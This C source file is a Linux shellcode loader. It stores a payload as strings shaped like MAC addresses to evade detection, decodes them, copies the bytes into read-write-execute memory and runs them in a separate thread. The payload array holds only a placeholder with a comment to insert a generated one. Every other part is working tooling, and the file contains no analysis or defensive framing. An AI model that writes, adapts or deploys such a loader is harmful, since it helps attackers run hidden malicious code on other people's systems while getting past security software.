#define _DEFAULT_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <ctype.h>

#define MAC_BINARY_SIZE 6

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

/*
 * Replace this placeholder with the generated MAC array.
 */
static const char* MACShell[] = {
    "00-00-00-00-00-00"
};

#define ELEMENTS_COUNT ((int)(sizeof(MACShell) / sizeof(MACShell[0])))
#define SHELLCODE_SIZE ((size_t)(ELEMENTS_COUNT * MAC_BINARY_SIZE))

typedef struct {
    unsigned char* buffer;
    size_t size;
    int element_count;
} ShellcodeInfo;

typedef struct {
    unsigned char bytes[MAC_BINARY_SIZE];
} MacAddress;

/**
 * @param mac_str -
 * @param mac_output 
 * @return 
 */
int parse_mac_string(const char* mac_str, MacAddress* mac_output) {
    unsigned int bytes[MAC_BINARY_SIZE];
    int result;
    
    result = sscanf(mac_str, "%2x-%2x-%2x-%2x-%2x-%2x",
                    &bytes[0], &bytes[1], &bytes[2],
                    &bytes[3], &bytes[4], &bytes[5]);
    
    if (result != MAC_BINARY_SIZE) {
        char clean_mac[18] = {0};
        int j = 0;
        
        for (int i = 0; mac_str[i] && j < 17; i++) {
            if (mac_str[i] != '-' && mac_str[i] != ' ' && mac_str[i] != ':') {
                clean_mac[j++] = mac_str[i];
            }
        }
        clean_mac[j] = '\0';
        
        result = sscanf(clean_mac, "%2x%2x%2x%2x%2x%2x",
                       &bytes[0], &bytes[1], &bytes[2],
                       &bytes[3], &bytes[4], &bytes[5]);
        
        if (result != MAC_BINARY_SIZE) {
            fprintf(stderr, "[!] Failed to parse MAC address: %s\n", mac_str);
            return -1;
        }
    }
    
    for (int i = 0; i < MAC_BINARY_SIZE; i++) {
        mac_output->bytes[i] = (unsigned char)(bytes[i] & 0xFF);
    }
    
    return 0;
}

/**
 * @param mac_strings 
 * @param output_buffer 
 * @param element_count 
 * @return 
 */
int decode_mac_fuscation(const char* mac_strings[], unsigned char* output_buffer, int element_count) {
    int offset = 0;
    MacAddress mac;
    
    for (int i = 0; i < element_count; i++) {
        if (parse_mac_string(mac_strings[i], &mac) != 0) {
            fprintf(stderr, "[!] Failed to decode MAC at index %d\n", i);
            return -1;
        }
        
        memcpy(output_buffer + offset, mac.bytes, MAC_BINARY_SIZE);
        offset += MAC_BINARY_SIZE;
    }
    
    return 0;
}

/**
 * @param size 
 * @return 
 */
void* allocate_executable_memory(size_t size) {
    void* buffer = mmap(NULL, size, 
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, 
                        -1, 0);
    
    if (buffer == MAP_FAILED) {
        perror("[!] mmap failed");
        return NULL;
    }
    
    mlock(buffer, size);
    
    return buffer;
}


void* execute_shellcode(void* arg) {
    void (*shellcode)() = (void(*)())arg;
    shellcode();
    return NULL;
}


void free_executable_memory(void* buffer, size_t size) {
    if (buffer != NULL && buffer != MAP_FAILED) {
        munlock(buffer, size);
        munmap(buffer, size);
    }
}


void print_shellcode_info(const ShellcodeInfo* info, void* exec_buffer) {
    printf("\n[i] Shellcode Information:\n");
    printf("    ├─ Size: %zu bytes\n", info->size);
    printf("    ├─ Elements: %d MAC addresses\n", info->element_count);
    printf("    ├─ Bytes per MAC: %d\n", MAC_BINARY_SIZE);
    printf("    ├─ Total decoded size: %zu bytes\n", (size_t)info->element_count * MAC_BINARY_SIZE);
    printf("    └─ Estimated instructions: ~%zu\n", info->size / 4);
    
    printf("\n[+] Memory Information:\n");
    printf("    ├─ Executable buffer: %p\n", exec_buffer);
    printf("    ├─ Protection: READ | WRITE | EXECUTE\n");
    printf("    └─ Memory locked: %s\n", (exec_buffer ? "Yes" : "No"));
}


int validate_shellcode_size(const ShellcodeInfo* info) {
    size_t calculated_size = info->element_count * MAC_BINARY_SIZE;
    
    if (calculated_size != info->size) {
        fprintf(stderr, "[!] Size mismatch: expected %zu, got %zu\n", 
                info->size, calculated_size);
        return -1;
    }
    
    return 0;
}


void debug_hex_dump(const unsigned char* buffer, size_t size) {
    printf("\n[*] Decoded Shellcode Hex Dump:\n");
    printf("    Offset | 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n");
    printf("    -------+------------------------------------------------\n");
    
    for (size_t i = 0; i < size; i += 16) {
        printf("    0x%04zx | ", i);
        
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) {
                printf("%02x ", buffer[i + j]);
            } else {
                printf("   ");
            }
            
            if (j == 7) printf(" ");
        }
        
        printf(" | ");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = buffer[i + j];
            if (isprint(c)) {
                printf("%c", c);
            } else {
                printf(".");
            }
        }
        
        printf("\n");
    }
}


void display_mac_addresses(const char* mac_strings[], int count) {
    printf("\n[*] MAC Addresses to decode:\n");
    
    for (int i = 0; i < count; i++) {
        printf("    [%2d] %s\n", i + 1, mac_strings[i]);
        
        if ((i + 1) % 4 == 0 && i + 1 < count) {
            printf("         ...\n");
        }
    }
}


unsigned int calculate_checksum(const unsigned char* buffer, size_t size) {
    unsigned int checksum = 0;
    
    for (size_t i = 0; i < size; i++) {
        checksum += buffer[i];
    }
    
    return checksum;
}

int main(int argc, char* argv[]) {
    ShellcodeInfo shellcode = {
        .buffer = NULL,
        .size = SHELLCODE_SIZE,
        .element_count = ELEMENTS_COUNT
    };
    
    void* exec_buffer = NULL;
    pthread_t thread_id;
    int result = 0;
    int debug_mode = 0;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--debug") == 0 || strcmp(argv[i], "-d") == 0) {
            debug_mode = 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s [options]\n", argv[0]);
            printf("Options:\n");
            printf("  -d, --debug     Enable debug mode (hex dump)\n");
            printf("  -h, --help      Show this help message\n");
            return 0;
        }
    }
    
    printf("[*] MAC Address Shellcode Decoder for Linux\n");
    printf("[*] =========================================\n");
    
    if (debug_mode) {
        display_mac_addresses(MACShell, shellcode.element_count);
    }
    
    printf("\n[1/5] Validating shellcode...\n");
    if (validate_shellcode_size(&shellcode) != 0) {
        return -1;
    }
    printf("[+] Validation passed\n");
    
    shellcode.buffer = (unsigned char*)malloc(shellcode.size);
    if (!shellcode.buffer) {
        perror("[!] Failed to allocate temporary buffer");
        return -1;
    }
    memset(shellcode.buffer, 0, shellcode.size);
    
    printf("[2/5] Decoding MAC address shellcode...\n");
    if (decode_mac_fuscation(MACShell, shellcode.buffer, shellcode.element_count) != 0) {
        fprintf(stderr, "[!] Failed to decode shellcode\n");
        result = -1;
        goto cleanup;
    }
    printf("[+] Shellcode decoded successfully\n");
    
    unsigned int checksum = calculate_checksum(shellcode.buffer, shellcode.size);
    printf("[+] Decoded checksum: 0x%08x\n", checksum);
    
    if (debug_mode) {
        debug_hex_dump(shellcode.buffer, shellcode.size);
    }
    
    printf("\n[3/5] Allocating executable memory...\n");
    exec_buffer = allocate_executable_memory(shellcode.size);
    if (!exec_buffer) {
        result = -1;
        goto cleanup;
    }
    printf("[+] Memory allocated at %p\n", exec_buffer);
    
    printf("\n[4/5] Copying shellcode to executable buffer...\n");
    memcpy(exec_buffer, shellcode.buffer, shellcode.size);
    
    if (memcmp(exec_buffer, shellcode.buffer, shellcode.size) == 0) {
        printf("[+] Shellcode copied successfully (%zu bytes)\n", shellcode.size);
    } else {
        fprintf(stderr, "[!] Shellcode copy verification failed\n");
        result = -1;
        goto cleanup;
    }
    
    print_shellcode_info(&shellcode, exec_buffer);
    
    printf("\n[5/5] Creating execution thread...\n");
    if (pthread_create(&thread_id, NULL, execute_shellcode, exec_buffer) != 0) {
        perror("[!] Failed to create thread");
        result = -1;
        goto cleanup;
    }
    printf("[+] Shellcode execution thread created (ID: %lu)\n", thread_id);
    
    printf("\n[+] Shellcode is now running\n");
    printf("[+] Press Enter to exit and clean up...\n");
    getchar();
    
    pthread_join(thread_id, NULL);
    
cleanup:
    printf("\n[*] Cleaning up resources...\n");
    
    if (shellcode.buffer) {
        free(shellcode.buffer);
        printf("[*] Temporary buffer freed\n");
    }
    
    if (exec_buffer) {
        free_executable_memory(exec_buffer, shellcode.size);
        printf("[*] Executable memory freed\n");
    }
    
    printf("[*] Cleanup complete\n");
    
    if (result == 0) {
        printf("\n[✓] Program terminated successfully\n");
    } else {
        printf("\n[✗] Program terminated with errors\n");
    }
    
    return result;
}
